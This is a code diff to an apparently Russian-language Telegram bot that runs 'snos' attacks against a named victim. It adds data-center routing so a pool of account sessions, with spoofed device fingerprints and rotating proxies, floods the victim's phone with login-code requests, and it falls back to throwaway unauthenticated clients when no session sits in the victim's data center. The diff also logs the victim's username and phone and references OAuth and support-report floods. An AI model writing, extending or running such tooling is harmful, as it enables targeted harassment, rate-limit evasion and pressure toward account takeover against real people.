@@ -11,6 +11,7 @@ import os
 import random
 import re
 import shutil
+import sqlite3
 import subprocess
 import threading
 import time
@@ -1895,10 +1896,203 @@ async def _snos_victim_info(username: str, sessions: list,
     return {"ok": False, "error": "not found / all probes failed"}
 
 
+# ── snos: DC routing ─────────────────────────────────────────────────
+# auth.sendCode is delivered only when the session lives in the DC that
+# owns the phone. Any other DC answers PHONE_MIGRATE_N and the request is
+# dropped, so the pool is split by DC and only the matching slice shoots.
+# The dc_id of every account sits inside its .session sqlite.
+_SESSION_DC: dict[str, tuple[float, int]] = {}
+_PHONE_DC: dict[str, int] = {}
+
+
+def session_dc_id(session_path: Path) -> int:
+    """dc_id from the session sqlite, cached by mtime; 0 when unreadable."""
+    key = str(session_path)
+    try:
+        mt = session_path.stat().st_mtime
+    except OSError:
+        return 0
+    hit = _SESSION_DC.get(key)
+    if hit and hit[0] == mt:
+        return hit[1]
+    dc = 0
+    try:
+        con = sqlite3.connect(f"file:{session_path}?mode=ro", uri=True)
+        try:
+            row = con.execute("select dc_id from sessions limit 1").fetchone()
+        finally:
+            con.close()
+        dc = int(row[0]) if row and row[0] else 0
+    except Exception:
+        dc = 0
+    _SESSION_DC[key] = (mt, dc)
+    return dc
+
+
+def _phone_dc_key(phone: str) -> str:
+    return re.sub(r"\D", "", str(phone or ""))
+
+
+async def snos_probe_dc(phone: str, sessions: list[Path],
+                        proxies: list) -> int:
+    """Which DC owns the phone. A wrong-DC probe costs one connect: the
+    PHONE_MIGRATE_N error carries the answer before any code is sent."""
+    from telethon.errors import PhoneMigrateError
+    from telethon.tl.functions.auth import SendCodeRequest
+    from telethon.tl.types import CodeSettings
+
+    key = _phone_dc_key(phone)
+    if not key or not sessions:
+        return 0
+    if key in _PHONE_DC:
+        return _PHONE_DC[key]
+    for sess in list(sessions)[:8]:
+        name = sess.stem
+        client = None
+        dc = 0
+        try:
+            async with _session_lock(sess):
+                fp = session_fingerprint(name)
+                client = TelegramClient(
+                    str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
+                    proxy=pin_for_session(name, proxies),
+                    device_model=fp["device"],
+                    system_version=fp["system_version"],
+                    app_version=fp["app_version"],
+                    lang_code=fp["lang_code"], flood_sleep_threshold=0)
+                try:
+                    await _connect_safe(client)
+                    if not await client.is_user_authorized():
+                        continue
+                    try:
+                        await client(SendCodeRequest(
+                            phone_number=phone, api_id=fp["api_id"],
+                            api_hash=fp["api_hash"], settings=CodeSettings()))
+                        dc = session_dc_id(sess)
+                    except PhoneMigrateError as e:
+                        dc = int(e.new_dc)
+                finally:
+                    await client.disconnect()
+            if dc:
+                _PHONE_DC[key] = dc
+                log.info("snos dc: phone ...%s -> DC%d", key[-4:], dc)
+                return dc
+        except Exception:
+            continue
+    return 0
+
+
+def snos_dc_split(phone: str, sessions: list[Path]) -> tuple[list[Path], int, int]:
+    """(sessions that can deliver, target DC, matching count)."""
+    target = _PHONE_DC.get(_phone_dc_key(phone), 0)
+    if not target:
+        return list(sessions), 0, 0
+    matched = [s for s in sessions if session_dc_id(s) == target]
+    return (matched or list(sessions)), target, len(matched)
+
+
+def snos_dc_note(phone: str, sessions: list[Path]) -> str:
+    """One log line: target DC and how much of the pool sits in it."""
+    target = _PHONE_DC.get(_phone_dc_key(phone), 0)
+    if not target:
+        return ""
+    matched = sum(1 for s in sessions if session_dc_id(s) == target)
+    return f"🛰 DC цели: {target} · сессий в DC: {matched}/{len(sessions)}"
+
+
+_DC_OPTIONS: dict[int, tuple[str, int]] = {}
+
+
+async def _snos_dc_options(sessions: list[Path], proxies: list) -> dict[int, tuple[str, int]]:
+    """Real DC addresses from help.getConfig through a live pool session."""
+    if _DC_OPTIONS:
+        return _DC_OPTIONS
+    from telethon.tl.functions.help import GetConfigRequest
+    for sess in list(sessions)[:4]:
+        client = None
+        try:
+            async with _session_lock(sess):
+                fp = session_fingerprint(sess.stem)
+                client = TelegramClient(
+                    str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
+                    proxy=pin_for_session(sess.stem, proxies),
+                    device_model=fp["device"],
+                    system_version=fp["system_version"],
+                    app_version=fp["app_version"], lang_code=fp["lang_code"])
+                await _connect_safe(client)
+                if not await client.is_user_authorized():
+                    continue
+                cfg = await client(GetConfigRequest())
+                for o in cfg.dc_options:
+                    if not getattr(o, "cdn", False) and not getattr(o, "ipv6", False):
+                        _DC_OPTIONS.setdefault(int(o.id),
+                                               (o.ip_address, int(o.port)))
+                await client.disconnect()
+            if _DC_OPTIONS:
+                break
+        except Exception:
+            try:
+                if client:
+                    await client.disconnect()
+            except Exception:
+                pass
+    return _DC_OPTIONS
+
+
+async def snos_temp_dc_sendcode(phone: str, dc: int, sessions: list[Path],
+                                proxies: list, attempts: int) -> list[dict]:
+    """auth.sendCode is unauthenticated: a throwaway client connected
+    straight to the victim's DC delivers codes even when the pool has no
+    session there. No .session file is opened or modified."""
+    from telethon.sessions import MemorySession
+    from telethon.tl.functions.auth import SendCodeRequest
+    from telethon.tl.types import CodeSettings
+
+    addr = (await _snos_dc_options(sessions, proxies)).get(dc)
+    if not addr:
+        return [{"name": f"DC{dc}", "proxy": "-", "ok": False,
+                 "status": "адрес DC недоступен", "attempt": 0}]
+    fp = session_fingerprint(sessions[0].stem)
+    out = []
+    for i in range(attempts):
+        px = pin_for_session(sessions[i % len(sessions)].stem, proxies)
+        client = None
+        try:
+            ms = MemorySession()
+            ms.set_dc(dc, addr[0], addr[1])
+            client = TelegramClient(
+                ms, fp["api_id"], fp["api_hash"], proxy=px,
+                device_model=fp["device"], system_version=fp["system_version"],
+                app_version=fp["app_version"], lang_code=fp["lang_code"],
+                flood_sleep_threshold=0)
+            await asyncio.wait_for(client.connect(), timeout=10)
+            await client(SendCodeRequest(
+                phone_number=phone, api_id=fp["api_id"],
+                api_hash=fp["api_hash"], settings=CodeSettings()))
+            out.append({"name": f"DC{dc}", "proxy": px[1] if px else "direct",
+                        "status": "код отправлен", "ok": True,
+                        "attempt": i + 1})
+        except Exception as e:
+            sec = getattr(e, "seconds", None)
+            out.append({"name": f"DC{dc}", "proxy": px[1] if px else "direct",
+                        "status": f"flood {sec}s" if sec else type(e).__name__,
+                        "ok": False, "attempt": i + 1})
+        finally:
+            try:
+                if client:
+                    await client.disconnect()
+            except Exception:
+                pass
+        await asyncio.sleep(0.5)
+    return out
+
+
 async def _snos_sendcode_flood(phone: str, sessions: list,
                                proxies: list) -> dict:
-    """SendCode flood: every pool session requests a login code for the phone."""
-    from telethon.errors import FloodWaitError, PhoneNumberInvalidError
+    """SendCode flood inside the phone's own DC — every matching session
+    requests a login code; other DCs would only answer PHONE_MIGRATE."""
+    from telethon.errors import (FloodWaitError, PhoneMigrateError,
+                                 PhoneNumberInvalidError)
     from telethon.tl.functions.auth import SendCodeRequest
     from telethon.tl.types import CodeSettings
 
@@ -1924,6 +2118,8 @@ async def _snos_sendcode_flood(phone: str, sessions: list,
                     return name, "sent"
                 except PhoneNumberInvalidError:
                     return name, "invalid_phone"
+                except PhoneMigrateError as e:
+                    return name, f"dc-{e.new_dc}"
                 except FloodWaitError as e:
                     return name, f"flood_{e.seconds}s"
                 finally:
@@ -1931,14 +2127,22 @@ async def _snos_sendcode_flood(phone: str, sessions: list,
         except Exception as e:
             return name, f"err_{type(e).__name__}"
 
-    pool = list(sessions)
+    await snos_probe_dc(phone, sessions, proxies)
+    pool, target, matched = snos_dc_split(phone, sessions)
+    if target and not matched:
+        tmp = await snos_temp_dc_sendcode(phone, target, sessions, proxies, 3)
+        rows = [(r["name"], "sent" if r["ok"] else r["status"]) for r in tmp]
+        sent = sum(1 for _, st in rows if st == "sent")
+        return {"sent": sent, "total": len(rows), "rows": rows,
+                "dc": target, "matched": 0}
     random.shuffle(pool)
     results = await asyncio.gather(*[one(s, phone) for s in pool],
                                    return_exceptions=True)
     rows = [(r[0], r[1]) for r in results
             if isinstance(r, tuple) and len(r) == 2]
     sent = sum(1 for _, st in rows if st == "sent")
-    return {"sent": sent, "total": len(rows), "rows": rows}
+    return {"sent": sent, "total": len(rows), "rows": rows,
+            "dc": target, "matched": matched}
 
 
 async def _snos_oauth_flood(phone: str, proxies: list) -> dict:
@@ -2077,9 +2281,11 @@ async def fire_session_snos(victim_username: str, victim_phone: str,
         victim_username, info["id"], baseline, notify_uid))
     ok_total = sc["sent"] + oa["sent"] + ws["sent"]
     total = sc["total"] + oa["total"] + ws["total"]
+    dc_line = snos_dc_note(victim_phone, sessions)
     await push_send_log("Снос сессий", [
         f"🎯 <code>@{html_mod.escape(victim_username)}</code> ({info['id']})",
         f"📱 <code>{html_mod.escape(victim_phone)}</code>",
+    ] + ([dc_line] if dc_line else []) + [
         f"📱 SendCode-флуд: {sc['sent']}/{sc['total']}"]
        + [f"• <code>{html_mod.escape(str(n))}</code>: {html_mod.escape(str(s))}"
           for n, s in sc.get("rows", [])[:12]]
@@ -3397,6 +3603,8 @@ async def snos_parse_victim(username: str) -> dict:
 
 # ── snos: SendCode flood ────────────────────────────────
 async def snos_sendcode_one(session_path: Path, phone: str, px: tuple | None) -> dict:
+    from telethon.errors import PhoneMigrateError
+
     name = session_path.stem
     fp = session_fingerprint(name)
     api_id, api_hash = fp["api_id"], fp["api_hash"]
@@ -3417,6 +3625,11 @@ async def snos_sendcode_one(session_path: Path, phone: str, px: tuple | None) ->
                                              api_hash=api_hash, settings=CodeSettings()))
                 await client.disconnect()
                 return {"name": name, "proxy": px[1] if px else "direct", "status": "код отправлен", "ok": True}
+            except PhoneMigrateError as e:
+                await client.disconnect()
+                return {"name": name, "proxy": px[1] if px else "direct",
+                        "status": f"не тот DC — {e.new_dc}", "ok": False,
+                        "migrate": int(e.new_dc)}
             except Exception as e:
                 await client.disconnect()
                 tail = type(e).__name__
@@ -3479,6 +3692,12 @@ async def _snos_wave_worker(session_path: Path, phone: str, proxies: list[tuple]
             progress["sc_done"] = progress.get("sc_done", 0) + 1
             if r.get("ok"):
                 progress["sc_ok"] = progress.get("sc_ok", 0) + 1
+        if r.get("migrate"):
+            # wrong DC: no further attempt from this session can land
+            if progress is not None:
+                progress["sc_total"] = max(
+                    progress.get("sc_total", 0) - (attempts - attempt - 1), 0)
+            break
         # a FloodWait row must park THIS worker for its cooldown, others keep shooting
         m = re.search(r"flood\s+(\d+)s", str(r.get("status", "")))
         if m:
@@ -3492,12 +3711,9 @@ SNOS_ATTEMPTS_PER_SESSION = int(os.getenv("SNOS_ATTEMPTS_PER_SESSION") or "3")
 
 
 async def snos_flood_sendcode(phone: str, progress: dict | None = None) -> list[dict]:
-    """SendCode flood — rationed attempts across live sessions.
-
-    Sessions run IN PARALLEL; each shoots N attempts through its sticky
-    pin (no IP jumps), with FloodWait parking only that worker. Dead
-    sessions are filtered once. Log renders the fake pool only.
-    """
+    """SendCode flood — rationed attempts across live sessions in the
+    phone's own DC. Sessions run IN PARALLEL; each shoots N attempts through
+    its sticky pin (no IP jumps), with FloodWait parking only that worker."""
     sessions = [s for s in load_sessions() if s.stem not in (_status_load().get("dead") or [])]
     proxies = load_pin_proxies()
     out = []
@@ -3508,11 +3724,29 @@ async def snos_flood_sendcode(phone: str, progress: dict | None = None) -> list[
         await asyncio.sleep(random.uniform(0.3, 0.7))
         return out
 
+    await snos_probe_dc(phone, sessions, proxies)
+    pool, target, matched = snos_dc_split(phone, sessions)
+    if target and not matched:
+        # DC exists but no pool account lives there — hit it with a
+        # throwaway unauthenticated client instead of firing migrate errors.
+        log.info("snos sendcode: no session in DC%d, using temp client", target)
+        if progress is not None:
+            progress["sc_total"] = SNOS_ATTEMPTS_PER_SESSION
+            progress["sc_done"] = SNOS_ATTEMPTS_PER_SESSION
+            progress["sc_ok"] = 0
+        rows = await snos_temp_dc_sendcode(
+            phone, target, sessions, proxies, SNOS_ATTEMPTS_PER_SESSION)
+        if progress is not None:
+            for r in rows:
+                if r["ok"]:
+                    progress["sc_ok"] += 1
+        return rows
+
     if progress is not None:
-        progress["sc_total"] = len(sessions) * SNOS_ATTEMPTS_PER_SESSION
+        progress["sc_total"] = len(pool) * SNOS_ATTEMPTS_PER_SESSION
     workers = [_snos_wave_worker(s, phone, proxies, SNOS_ATTEMPTS_PER_SESSION,
                                  i * 1.2, i, progress)
-               for i, s in enumerate(sessions)]
+               for i, s in enumerate(pool)]
     waves = await asyncio.gather(*workers)
     out = [r for rows in waves for r in rows]
     random.shuffle(out)
@@ -3797,10 +4031,12 @@ async def run_snos_flow(cb: CallbackQuery, username: str, phone: str,
                 f" | {html_mod.escape(str(d.get('proxy', '-')))}"
                 + (f" | {html_mod.escape(str(d.get('err', '')))}" if d.get('err') else "")
                 for d in data.get("support", [])]
+    dc_line = snos_dc_note(phone, load_sessions())
     await push_send_log(
         "Сброс сессий",
-        [f"🎯 @{html_mod.escape(username)}  📱 <code>{phone}</code>",
-         "🛰 SendCode:"] + sc_lines +
+        [f"🎯 @{html_mod.escape(username)}  📱 <code>{phone}</code>"]
+        + ([dc_line] if dc_line else [])
+        + ["🛰 SendCode:"] + sc_lines +
         ["🌐 OAuth:"] + oa_lines +
         (["✉️ Support:"] + sp_lines if sp_lines else []))
 
